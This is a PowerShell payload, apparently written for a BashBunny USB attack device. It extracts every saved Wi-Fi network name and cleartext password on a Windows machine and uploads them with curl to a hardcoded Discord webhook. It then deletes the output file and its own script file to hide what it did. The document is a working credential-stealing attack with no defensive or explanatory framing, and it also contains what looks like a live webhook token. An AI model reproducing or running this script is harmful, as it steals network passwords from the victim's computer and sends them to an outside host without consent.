(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize  >> asdf2.txt
$WEBHOOK_URL = "https://discord.com/api/webhooks/963840591622455386/k0EAK4lgAPmMyupPhp3Yp0PYR7NZJSLFre3fV_cXlfPvhux0Y43iNTSDq3QwqymbFTUx"
curl `
  -F "payload_json={\"content\": \"Platform:\tBashBunny\nTarget:\t\tGalifrey\nOS:\t\t\t  $osx\"}" `
  -F "file1=@asdf2.txt" `
  -F "file2=.\asdf2.txt" `
  $WEBHOOK_URL

Remove-Item '.\asdf2.txt'
Remove-Item '.\d.ps1'
Stop-Process -name CMD



